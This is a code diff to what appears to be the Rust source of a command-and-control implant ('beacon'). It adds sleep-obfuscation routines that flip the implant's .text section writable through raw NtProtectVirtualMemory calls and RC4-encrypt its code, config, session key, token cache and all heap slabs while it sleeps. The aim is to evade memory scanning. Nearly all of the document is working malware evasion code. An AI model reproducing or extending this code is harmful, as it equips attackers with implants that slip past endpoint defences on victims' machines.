@@ -36,9 +36,12 @@ use nyx_implant_evasionsdk::rc4::Rc4;
 /// double-mask produces keystream∘keystream, not cleartext).
 static MASK_STATE: AtomicU8 = AtomicU8::new(0);
 
-/// Cap on the number of registered sensitive regions. The registered set is
-/// tiny in practice (a decrypted profile, a credential cache); 8 is headroom.
-const MAX_REGIONS: usize = 8;
+/// Cap on the number of registered sensitive regions. Covers:
+/// - config plaintext (1)
+/// - session key (1)
+/// - token cache, BOF output buffers, operator-registered regions (up to ~28)
+/// Total 32 — enough for a fully-loaded beacon with multiple concurrent BOFs.
+const MAX_REGIONS: usize = 32;
 
 /// Registered sensitive regions, each a raw `&'static mut [u8]` pointer + len.
 /// Stored as raw parts because the regions are `'static` (process-lifetime
@@ -189,6 +192,110 @@ pub fn unmask() {
         return; // already cleartext
     }
     apply_rc4_to_regions();
+}
+
+/// Collect registered regions + all allocator slabs into a single mask list.
+/// Called by the Foliage helper thread during the mask window. Each entry is
+/// `(base_ptr, byte_len)` — the caller RC4's each region with the same key.
+///
+/// Registered regions (config, key, token cache) take priority slots; allocator
+/// slabs fill remaining capacity. Total coverage includes both explicit regions
+/// and all heap pages from the bump allocator.
+pub fn enumerate_beacon_heap_regions() -> alloc::vec::Vec<(*mut u8, usize)> {
+    let mut result = alloc::vec::Vec::with_capacity(MAX_REGIONS + crate::ntalloc::MAX_SLABS);
+    // 1. Registered sensitive regions (config, key, operator-registered).
+    for i in 0..MAX_REGIONS {
+        let ptr = REGIONS[i].load(Ordering::Acquire);
+        if ptr == 0 {
+            continue;
+        }
+        let len = REGION_LENS[i].load(Ordering::Acquire);
+        if len == 0 {
+            continue;
+        }
+        result.push((ptr as *mut u8, len));
+    }
+    // 2. All allocator slabs (heap pages — config, transport buffers, BOF scratch).
+    for (base, len) in crate::ntalloc::enumerate_slabs() {
+        result.push((base, len));
+    }
+    result
+}
+
+/// Mask text + all registered + heap regions in a single RC4 pass.
+/// Called by the Foliage helper inside the mask window (beacon is in alertable
+/// sleep). The caller supplies the raw NtProtectVirtualMemory for .text and
+/// the RC4 key.
+///
+/// # Safety
+/// Caller MUST guarantee the beacon thread is NOT executing (it's sleeping
+/// via alertable NtWaitForSingleObject). The .text flip + RC4 + heap RC4 all
+/// happen in this window.
+pub unsafe fn mask_text_and_heap(
+    text_base: usize,
+    text_len: usize,
+    key: &[u8],
+    raw: &crate::sleep::FoliageRaw,
+) {
+    // 1. Flip .text RX → RW.
+    let mut b = text_base;
+    let mut s = text_len;
+    let mut old: u32 = 0;
+    let _ = raw.nt_protect_virtual_memory(&mut b, &mut s, 0x04, &mut old);
+    // 2. RC4 .text.
+    let text = core::slice::from_raw_parts_mut(text_base as *mut u8, text_len);
+    Rc4::apply_oneshot(key, text);
+    // 3. RC4 all registered regions + heap slabs.
+    for (ptr, len) in enumerate_beacon_heap_regions() {
+        let region = core::slice::from_raw_parts_mut(ptr, len);
+        Rc4::apply_oneshot(key, region);
+    }
+}
+
+/// Unmask heap + registered regions + text (inverse of mask_text_and_heap).
+pub unsafe fn unmask_text_and_heap(
+    text_base: usize,
+    text_len: usize,
+    key: &[u8],
+    raw: &crate::sleep::FoliageRaw,
+) {
+    // 1. RC4 all registered regions + heap slabs (reverse order doesn't matter
+    //    for RC4 — same key + fresh cipher = deterministic round-trip).
+    for (ptr, len) in enumerate_beacon_heap_regions() {
+        let region = core::slice::from_raw_parts_mut(ptr, len);
+        Rc4::apply_oneshot(key, region);
+    }
+    // 2. RC4 .text (decrypt).
+    let text = core::slice::from_raw_parts_mut(text_base as *mut u8, text_len);
+    Rc4::apply_oneshot(key, text);
+    // 3. Flip .text RW → RX.
+    let mut b = text_base;
+    let mut s = text_len;
+    let mut old: u32 = 0;
+    let _ = raw.nt_protect_virtual_memory(&mut b, &mut s, 0x20, &mut old);
+}
+
+/// Mask only the registered regions + heap slabs (NOT .text).
+/// Called by the Foliage helper after .text is already masked, to cover
+/// heap-allocated sensitive data (config, key, token cache, BOF scratch).
+/// Uses the same RC4 key as the .text mask so a single key covers everything.
+pub fn mask_heap_regions(key: &[u8]) {
+    for (ptr, len) in enumerate_beacon_heap_regions() {
+        // SAFETY: the region was registered/allocated as a mutable buffer;
+        // the beacon thread is in alertable sleep during the Foliage mask window.
+        let region = unsafe { core::slice::from_raw_parts_mut(ptr, len) };
+        Rc4::apply_oneshot(key, region);
+    }
+}
+
+/// Unmask only the registered regions + heap slabs (NOT .text).
+/// Inverse of [`mask_heap_regions`]. Must run before .text is unmasked.
+pub fn unmask_heap_regions(key: &[u8]) {
+    // Same RC4 round-trip: decrypt == encrypt with same key + fresh cipher.
+    for (ptr, len) in enumerate_beacon_heap_regions() {
+        let region = unsafe { core::slice::from_raw_parts_mut(ptr, len) };
+        Rc4::apply_oneshot(key, region);
+    }
 }
 
 /// Selftest helper: mask + unmask a caller-provided buffer using the *internal*
